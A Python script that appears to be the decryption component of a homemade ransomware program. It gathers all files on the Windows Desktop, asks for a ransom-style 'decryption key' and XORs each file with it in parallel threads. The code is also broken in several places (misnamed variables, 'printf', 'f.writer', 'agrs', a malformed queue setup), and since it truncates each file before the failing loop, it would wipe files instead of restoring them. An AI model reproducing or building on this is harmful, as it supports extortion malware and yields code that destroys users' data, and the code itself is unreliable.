import os
import threading
import queue

def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypt {file}')
        try:
            index_key = 8
            max_key_index = len(key) - 1
            encrypted_data = ''
            
            with open(file, 'rb') as f:
                data = f.read()          
            with open(file, 'w') as f:
                f.write('')
            
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.writer(xor_byte.to_bytes(1,'little'))
                
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
                    
            printf(f'{file} Decrypted')
        except:
            print('Error')
        q.task_done()
        
        
ENCRYPTION_LEVEL = 512

key_char_pool = 'dhjgbjsdfbkjgbjdfbghrekt48564bh5b346'
key_char_pool_len = len(key_char_pool)

print("Hum...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []

for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print('Success files found')

key = input("INSERT YOUT DECRYPTION KEY HERE!!")

q.queue.Queue()

for f in abs_files:
    q.put(f)
    
for i in range(10):
    t = threading.Thread(target=decrypt, agrs=(key,), daemon = True)
    t.start()
    
q.join()
printf("Success decryption!!")
input()
              
